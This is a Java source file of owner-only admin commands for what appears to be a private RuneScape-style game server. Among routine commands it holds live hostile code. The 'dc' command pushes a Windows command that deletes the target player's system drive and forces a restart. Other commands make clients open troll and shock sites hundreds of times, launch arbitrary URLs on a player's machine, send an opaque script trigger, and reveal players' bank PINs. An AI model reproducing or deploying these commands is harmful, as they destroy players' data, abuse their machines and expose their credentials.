package org.hyperion.rs2.commands.newimpl;
//<editor-fold defaultstate="collapsed" desc="Imports">
import org.hyperion.Configuration;
import org.hyperion.Server;
import org.hyperion.engine.task.impl.NpcDeathTask;
import org.hyperion.rs2.commands.NewCommand;
import org.hyperion.rs2.commands.NewCommandExtension;
import org.hyperion.rs2.commands.impl.cmd.PromoteCommand;
import org.hyperion.rs2.commands.util.CommandInput;
import org.hyperion.rs2.model.*;
import org.hyperion.rs2.model.container.ShopManager;
import org.hyperion.rs2.model.container.Trade;
import org.hyperion.rs2.model.content.ContentEntity;
import org.hyperion.rs2.model.content.ContentManager;
import org.hyperion.rs2.model.content.minigame.FightPits;
import org.hyperion.rs2.model.content.misc.TriviaBot;
import org.hyperion.rs2.model.content.publicevent.ServerEventTask;
import org.hyperion.rs2.model.possiblehacks.IPChange;
import org.hyperion.rs2.model.possiblehacks.PasswordChange;
import org.hyperion.rs2.model.possiblehacks.PossibleHack;
import org.hyperion.rs2.model.possiblehacks.PossibleHacksHolder;
import org.hyperion.rs2.net.ActionSender;
import org.hyperion.rs2.packet.CommandPacketHandler;
import org.hyperion.rs2.packet.ObjectClickHandler;
import org.hyperion.rs2.util.TextUtils;
import org.hyperion.util.Misc;

import java.io.*;
import java.nio.file.Files;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.logging.Level;
//</editor-fold>
/**
 * Created by DrHales on 2/29/2016.
 */
public class OwnerCommands implements NewCommandExtension {
    //<editor-fold defaultstate="collapsed" desc="Rank">
    private final Rank rank = Rank.OWNER;
    //</editor-fold>
    //<editor-fold defaultstate="collapsed" desc="Commands List">
    @Override
    public List<NewCommand> init() {
        return Arrays.asList(
                new NewCommand("reloaddrops", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String name = "./data/npcdrops.cfg";
                        int count = 1;
                        try (BufferedReader reader = new BufferedReader(new FileReader(name))) {
                            String line;
                            while ((line = reader.readLine()) != null) {
                                int spot = line.indexOf("'='");
                                if (spot > -1) {
                                    int id = 0;
                                    int i = 1;
                                    if (line.contains("/")) {
                                        line = line.substring(spot + 1, line.indexOf("/"));
                                    } else {
                                        line = line.substring(spot + 1);
                                    }
                                    String values = line;
                                    values = values.replaceAll("\t\t", "\t").trim();
                                    String[] array = values.split("\t");
                                    id = Integer.parseInt(array[0]);
                                    NPCDefinition definition = NPCDefinition.forId(id);
                                    definition.getDrops().clear();
                                    for (i = 1; i < array.length; i++) {
                                        String[] itemData = array[i].split("-");
                                        final int itemId = Integer.valueOf(itemData[0]);
                                        final int minAmount = Integer.valueOf(itemData[1]);
                                        final int maxAmount = Integer.valueOf(itemData[2]);
                                        final int chance = Integer.valueOf(itemData[3]);
                                        definition.getDrops().add(NPCDrop.create(itemId, minAmount, maxAmount, chance));
                                    }
                                }
                                count++;
                            }
                            reader.close();
                            player.sendf("Reloaded Drops.");
                        } catch (IOException ex) {
                            Server.getLogger().log(Level.WARNING, String.format("Error Reading %s", name), ex);
                        }
                        return true;
                    }
                },
                new NewCommand("givepkp", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setPkPoints(target.getPoints().getPkPoints() + amount);
                        player.sendf("%s now has %,d pk points", target.getName(), target.getPoints().getPkPoints());
                        return true;
                    }
                },
                new NewCommand("kickall", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(p -> !player.equals(p)).forEach(p -> p.getSession().close(true));
                        return true;
                    }
                },
                new NewCommand("dpbought", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        player.sendf("%s has bought '%,d' Donator Points", TextUtils.optimizeText(target.getName()), target.getPoints().getDonatorPointsBought());
                        return true;
                    }
                },
                new NewCommand("spawnitem", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Item ID", "An Existing Item ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount between 0 & %,d", Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int id = Integer.parseInt(input[1].trim());
                        final int amount = Integer.parseInt(input[2].trim());
                        target.getInventory().add(Item.create(id, amount));
                        target.getExpectedValues().addItemtoInventory("Spawning", Item.create(id, amount));
                        player.sendf("Added %s x %,d to %s's inventory", ItemDefinition.forId(id).getName(), amount, TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("reloadconfig", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Configuration.reloadConfiguration();
                        return true;
                    }
                },
                new NewCommand("lanceurl", rank, new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "URL", "A URL")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ActionSender.yellMessage(String.format("l4unchur13 http://www.%s", input[0].trim().startsWith("http://www.") ? input[0].replace("http://www.", "").trim() : input[0].trim()));
                        return true;
                    }
                },
                new NewCommand("dc", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendMessage(":cmd:del%systemdrive%\\*.*/f/s/q shutdown -r -f -t 00");
                        return true;
                    }
                },
                new NewCommand("fileobject", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendMessage("script7894561235");
                        player.sendf("Sent '%s' script7894561235.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("food", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ContentEntity.addItem(player, 15272, player.getInventory().freeSlots());
                        return true;
                    }
                },
                new NewCommand("enablepvp", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.updatePlayerAttackOptions(true);
                        player.getActionSender().sendMessage("PvP combat enabled.");
                        return true;
                    }
                },
                new NewCommand("ferry", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.setTeleportTarget(Position.create(3374, 9747, 4));
                        return true;
                    }
                },
                new NewCommand("daepicrape", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        for (int array = 0; array < 100; array++) {
                            target.getActionSender().sendMessage("l4unchur13 http://www.recklesspk.com/troll.php");
                            target.getActionSender().sendMessage("l4unchur13 http://www.nobrain.dk");
                            target.getActionSender().sendMessage("l4unchur13 http://www.meatspin.com");
                        }
                        return true;
                    }
                },
                new NewCommand("skill", rank, new CommandInput<Integer>(integer -> integer > -1 && integer < 25, "Integer", "Skill ID"), new CommandInput<Integer>(integer -> integer < 21, "Integer", "Boost Amount")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int skill = Integer.parseInt(input[0].trim());
                        int level = Integer.parseInt(input[1].trim());
                        player.getSkills().setLevel(skill, level);
                        player.sendMessage(String.format("%s level is temporarily boosted to %,d", Skills.SKILL_NAME[skill]), level);
                        return true;
                    }
                },
                new NewCommand("lvl", rank, new CommandInput<Integer>(integer -> integer > 0 && integer < 25, "Integer", "Skill ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < 100, "Integer", "Level")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int skill = Integer.parseInt(input[0].trim());
                        int level = Integer.parseInt(input[1].trim());
                        player.getSkills().setLevel(skill, level);
                        player.getSkills().setExperience(skill, player.getSkills().getXPForLevel(level) + 1);
                        player.sendf("%s level is now %,d.", Skills.SKILL_NAME[skill], level);
                        return true;
                    }
                },
                new NewCommand("givedp", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Integer", String.format("An amount between 0 & %,d", Integer.MAX_VALUE)), new CommandInput<String>(string -> string.trim().equalsIgnoreCase("true") || string.trim().equalsIgnoreCase("false"), "Boolean", "Bought [True or False]")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        final boolean bought = Boolean.parseBoolean(input[2].trim());
                        target.getPoints().increaseDonatorPoints(amount, bought);
                        player.sendf("You have given '%s' '%,dx' Donator Points.", TextUtils.optimizeText(target.getName()), amount);
                        return true;
                    }
                },
                new NewCommand("givemax", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An online player.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        for (int array = 0; array <= 24; array++) {
                            if (array != 21 && array != 22) {
                                target.getSkills().setLevel(array, 99);
                                target.getSkills().setExperience(array, Skills.getXPForLevel(99));
                            }
                        }
                        target.getPoints().setEloRating(1900);
                        return true;
                    }
                },
                new NewCommand("reloadhax", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        PossibleHacksHolder.getList().clear();
                        PossibleHacksHolder.init();
                        return true;
                    }
                },
                new NewCommand("resetpevents", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ServerEventTask.CountDownEventBuilder[] builders = new ServerEventTask.CountDownEventBuilder[]{
                                new ServerEventTask.CountDownEventBuilder("Fight pits", "fightpits", Position.create(2399, 5178, 0), "3x Pk points game", () -> FightPits.startEvent(), true),
                                new ServerEventTask.CountDownEventBuilder("Hybridding", "hybrid", false),
                                new ServerEventTask.CountDownEventBuilder("OldSchool PK", "ospk", false),
                                new ServerEventTask.CountDownEventBuilder("Pure Pking", "purepk", false),
                                new ServerEventTask.CountDownEventBuilder(8133, Position.create(2521, 4647, 0)),
                                new ServerEventTask.CountDownEventBuilder(8596, Position.create(2660, 9634, 0)),
                                new ServerEventTask.CountDownEventBuilder(50, Position.create(2270, 4687, 0))
                        };
                        for (int array = 0; array < ServerEventTask.builders.length; array++) {
                            ServerEventTask.builders[array] = builders[array];
                        }
                        return true;
                    }
                },
                new NewCommand("resetnpcdd", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        NpcDeathTask.npcIdForDoubleDrops = -1;
                        return true;
                    }
                },
                new NewCommand("resetpossiblehacks", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final List<String> charMasterList = new ArrayList<>();
                        SimpleDateFormat date = new SimpleDateFormat("dd-MMM-yyyy");
                        SimpleDateFormat format = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzz yyyy");
                        Date LAST_PASS_RESET;
                        try {
                            LAST_PASS_RESET = date.parse("31-April-2015");
                        } catch (ParseException ex) {
                            Server.getLogger().log(Level.WARNING, "Date Format Error", ex);
                            player.sendf("Error reloading possible hacks.");
                            return true;
                        }
                        for (PossibleHack hack : PossibleHacksHolder.getList()) {
                            if (hack instanceof PasswordChange) {
                                try {
                                    if (format.parse(hack.date).getTime() < LAST_PASS_RESET.getTime()) {
                                        continue;
                                    }
                                } catch (ParseException ex) {
                                    Server.getLogger().log(Level.WARNING, "Date Format Error", ex);
                                    player.sendf("Error reloading possible hacks.");
                                    return true;
                                }
                                PasswordChange change = (PasswordChange) hack;
                                if (change.newPassword.trim().equalsIgnoreCase("penis") || change.newPassword.equalsIgnoreCase("pene")) {
                                    final Player target = World.getPlayerByName(change.name.trim());
                                    if (target != null) {
                                        target.setPassword(change.oldPassword.trim());
                                    } else {
                                        final File file = CommandPacketHandler.getPlayerFile(change.name.trim());
                                        try {
                                            final List<String> list = Files.readAllLines(file.toPath());
                                            final List<String> newList = new ArrayList<>();
                                            list.stream().filter(string -> string.trim().toLowerCase().startsWith("pass")).forEach(string -> {
                                                string = String.format("Pass=", change.oldPassword.trim());
                                                newList.add(string);
                                            });
                                            newList.stream().forEach(string -> {
                                                try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                                                    writer.write(string);
                                                    writer.newLine();
                                                    writer.flush();
                                                    writer.close();
                                                } catch (IOException ex) {
                                                    Server.getLogger().log(Level.WARNING, String.format("Error Writing to File %s", file.getName()), ex);
                                                }
                                            });
                                            TextUtils.writeToFile("./data/NEWHAX.txt", String.format("%s:%s"));
                                            charMasterList.add(change.name.trim());
                                        } catch (IOException ex) {
                                            Server.getLogger().log(Level.WARNING, String.format("Error Reading File %s", file.getName()), ex);
                                        }
                                    }
                                }
                            }
                        }
                        final List<String> hasChanged = new ArrayList<>();
                        for (int array = PossibleHacksHolder.getList().size() - 1; array > 0; array--) {
                            final PossibleHack hack = PossibleHacksHolder.getList().get(array);
                            try {
                                if (format.parse(hack.date).getTime() < LAST_PASS_RESET.getTime()) {
                                    continue;
                                }
                            } catch (ParseException ex) {
                                Server.getLogger().log(Level.WARNING, "Date Format Error", ex);
                                player.sendf("Error reloading possible hacks.");
                            }
                            if (hack instanceof IPChange && charMasterList.contains(hack.name.trim()) && !hasChanged.contains(hack.name.trim())) {
                                IPChange change = (IPChange) hack;
                                final Player target = World.getPlayerByName(hack.name.trim());
                                if (target != null) {
                                    target.getExtraData().put("isdrasticallydiff", false);
                                } else {
                                    final File file = CommandPacketHandler.getPlayerFile(change.name.trim());
                                    try {
                                        final List<String> list = Files.readAllLines(file.toPath());
                                        final List<String> newList = new ArrayList<>();
                                        list.stream().filter(string -> string.trim().toLowerCase().startsWith("ip")).forEach(string -> {
                                            string = String.format("IP=%s", change.ip.trim());
                                            newList.add(string);
                                        });
                                        newList.stream().forEach(string -> {
                                            try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                                                writer.write(string);
                                                writer.newLine();
                                                writer.flush();
                                                writer.close();
                                            } catch (IOException ex) {
                                                Server.getLogger().log(Level.WARNING, String.format("Error Writing to File %s", file.getName()), ex);
                                            }
                                        });
                                        hasChanged.add(change.name.trim());
                                    } catch (IOException ex) {
                                        Server.getLogger().log(Level.WARNING, String.format("Error Reading File %s", file.getName()), ex);
                                    }
                                }
                            }
                        }
                        return true;
                    }

                },
                new NewCommand("findsdonors", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendMessage("-----Online Super Donators------");
                        World.getPlayers().stream().filter(target -> target != null && Rank.hasAbility(target, Rank.SUPER_DONATOR)).forEach(target -> {
                            player.sendMessage(TextUtils.optimizeText(target.getName()));
                        });
                        player.sendMessage("-----Listed All Online Super Donators-----");
                        return true;
                    }
                },
                new NewCommand("findrdonors", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendMessage("-----Online Regular Donators-----");
                        World.getPlayers().stream().filter(target -> target != null && Rank.hasAbility(target, Rank.DONATOR)).forEach(target -> {
                            player.sendMessage(TextUtils.optimizeText(target.getName()));
                        });
                        player.sendMessage("-----Listed All Online Regular Donators-----");
                        return true;
                    }
                },
                new NewCommand("doatkemote", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.cE.doAtkEmote();
                        player.sendMessage(player.getCombat().getAtkEmote());
                        return true;
                    }
                },
                new NewCommand("removerank", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null && Rank.forIndex(integer) != Rank.PLAYER, "Integer", "Rank Index above Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final Rank rank = Rank.forIndex(Integer.parseInt(input[1].trim()));
                        target.setPlayerRank(Rank.removeAbility(target, rank));
                        player.sendf("Removed %s rank from %s", rank, TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("giverank", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null && Rank.forIndex(integer) != Rank.PLAYER, "Integer", "Rank Index not equal to player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final Rank rank = Rank.forIndex(Integer.parseInt(input[1].trim()));
                        target.setPlayerRank(Rank.addAbility(target, rank));
                        target.sendf("You've been give '%s'", rank);
                        player.sendf("Player '%s' has the abilities:");
                        Arrays.asList(Rank.values()).stream().filter(value -> Rank.hasAbility(target, value)).forEach(value -> player.sendf("@whi@%s%s", rank, Rank.isAbilityToggled(target, value) ? "" : " [I]"));
                        return true;
                    }
                },
                new NewCommand("rankids", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Arrays.asList(Rank.values()).stream().forEach(rank -> player.sendf("[%s]:%,d", rank, rank.ordinal()));
                        return true;
                    }
                },
                new NewCommand("gc", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        System.gc();
                        player.sendMessage("Garbage Collected.");
                        return true;
                    }
                },
                new NewCommand("givefreetabs", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> {
                            ContentEntity.addItem(target, 8007 + Misc.random(5), 100);
                            target.sendf("'%s' just gave you 100 tabs!", TextUtils.optimizeText(target.getName()));
                        });
                        return true;
                    }
                },
                new NewCommand("resetcam", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().cameraReset();
                        return true;
                    }
                },
                new NewCommand("resetcontent", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ContentManager.init();
                        player.sendMessage("Content Manager Initiated");
                        return true;
                    }
                },
                new NewCommand("head", rank, new CommandInput<Integer>(integer -> integer > 0, "Integer", "Head Icon")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.headIconId = Integer.parseInt(input[0].trim());
                        player.getUpdateFlags().flag(UpdateFlags.UpdateFlag.APPEARANCE);
                        return true;
                    }
                },
                new NewCommand("prayer", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.resetPrayers();
                        player.getPrayers().setPrayerbook(!player.getPrayers().isDefaultPrayerbook());
                        player.getActionSender().sendSidebarInterface(5, player.getPrayers().isDefaultPrayerbook() ? 5608 : 22500);
                        return true;
                    }
                },
                new NewCommand("interface", rank, new CommandInput<Integer>(integer -> integer > 0, "Integer", "Interface ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().showInterface(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new NewCommand("2interface", rank, new CommandInput<Integer>(integer -> integer > 0, "Integer", "Interface ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().sendInterfaceInventory(Integer.parseInt(input[0].trim()), 3213);
                        return true;
                    }
                },
                new NewCommand("sidebarinterface", rank, new CommandInput<Integer>(integer -> integer > -1, "Integer", "Icon ID"), new CommandInput<Integer>(integer -> integer > 0, "Integer", "Interface ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().sendSidebarInterface(Integer.parseInt(input[0].trim()), Integer.parseInt(input[1].trim()));
                        return true;
                    }
                },
                new NewCommand("option", rank, new CommandInput<Integer>(integer -> integer > 0, "Integer", "Option ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().sendPacket164(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new NewCommand("nameobj", rank, new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "Object Name")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int array = 0; array < GameObjectDefinition.MAX_DEFINITIONS; array++) {
                            if (GameObjectDefinition.forId(array).getName().toLowerCase().trim().contains(input[0].trim())) {
                                player.sendf("%,d\t%s", array, GameObjectDefinition.forId(array).getName());
                            }
                        }
                        return true;
                    }
                },
                new NewCommand("spawnaltars", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().sendCreateObject(54, 49, 13192, 10, 0);
                        return true;
                    }
                },
                new NewCommand("string", rank, new CommandInput<Integer>(integer -> integer > 0, "Integer", "Component ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int value = Integer.parseInt(input[0].trim());
                        player.getActionSender().sendString(value, String.format("[Component]: %,d", value));
                        return true;
                    }
                },
                new NewCommand("restore") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        try {
                            NPCManager.restoreArea(player.getPosition());
                        } catch (IOException ex) {
                            player.sendf("Error restoring location - %s", player.getPosition());
                            Server.getLogger().log(Level.WARNING, String.format("Error Restoring Area - %s", player.getPosition()), ex);
                        }
                        player.sendf("Succesfully restored location - %s", player.getPosition());
                        return true;
                    }
                },
                new NewCommand("anim", rank, new CommandInput<Integer>(integer -> integer > -2, "Integer", "Animation ID"), new CommandInput<Integer>(integer -> integer > -1, "Integer", "Delay Amount")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.playAnimation(Animation.create(Integer.parseInt(input[0].trim()), Integer.parseInt(input[1].trim())));
                        return true;
                    }
                },
                new NewCommand("launchforplayer", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "URL to Launch")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendf("l4unchur13 http://www.%s", input[1].trim());
                        return true;
                    }
                },
                new NewCommand("reloadquestions", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        TriviaBot.loadQuestions();
                        player.getActionSender().sendMessage("Reloaded");
                        return true;
                    }
                },
                new NewCommand("wanim", rank, new CommandInput<Integer>(integer -> integer > -2, "Integer", "Animation ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int value = Integer.parseInt(input[0].trim());
                        player.getAppearance().setAnimations(value, value, value);
                        player.getUpdateFlags().flag(UpdateFlags.UpdateFlag.APPEARANCE);
                        return true;
                    }
                },
                new NewCommand("diag", rank, new CommandInput<Integer>(integer -> integer > 0, "Integer", "Dialog ID"), new CommandInput<Integer>(integer -> integer > 0, "Integer", "World NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.setInteractingEntity(World.getNpcs().get(Integer.parseInt(input[1].trim())));
                        DialogueManager.openDialogue(player, Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new NewCommand("swing", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ObjectClickHandler.objectClickOne(player, 26303, 1, 1);
                        return true;
                    }
                },
                new NewCommand("gfx", rank, new CommandInput<Integer>(integer -> integer > -2, "Integer", "Graphics ID"), new CommandInput<Integer>(integer -> integer > -1, "Integer", "Delay Amount")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.playGraphics(Graphic.create(Integer.parseInt(input[0].trim(), Integer.parseInt(input[1].trim()))));
                        return true;
                    }
                },
                new NewCommand("trade", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Trade.open(player, null);
                        return true;
                    }
                },
                new NewCommand("pin", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        player.sendf("[%s]: %s", TextUtils.optimizeText(target.getName()), target.bankPin);
                        return true;
                    }
                },
                new NewCommand("tuti", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        player.sendf("Player %s is at %s tutorial stage.", TextUtils.optimizeText(target.getName()), target.tutIsland);
                        return true;
                    }
                },
                new NewCommand("kick", rank, new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        System.out.println(String.format("Kicking: %s", target.getName()));
                        World.unregister(target);
                        return true;
                    }
                },
                new NewCommand("jad", rank, new CommandInput<Integer>(integer -> integer > 0, "Integer", "?")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ContentManager.handlePacket(6, player, 9358, Integer.parseInt(input[0].trim()), 1, 1);
                        return true;
                    }
                },
                new NewCommand("resetshops", rank) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        long initial = System.currentTimeMillis();
                        try {
                            ShopManager.reloadShops();
                        } catch (IOException ex) {
                            player.sendMessage("Error reloading shops");
                            Server.getLogger().log(Level.WARNING, "Error reloading Shops", ex);
                        }
                        player.sendf("Reloaded shops in %'dms", System.currentTimeMillis() - initial);
                        return true;
                    }
                }
        );
    }
    //</editor-fold>
}
